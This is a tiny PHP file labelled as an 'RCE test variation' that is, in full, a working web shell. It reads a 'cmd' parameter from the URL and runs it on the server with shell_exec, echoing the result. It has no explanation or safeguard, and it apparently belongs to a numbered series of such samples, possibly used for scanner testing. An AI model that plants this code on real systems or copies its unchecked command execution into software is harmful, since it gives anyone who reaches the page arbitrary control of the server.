<?php
// RCE test variation #1175
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>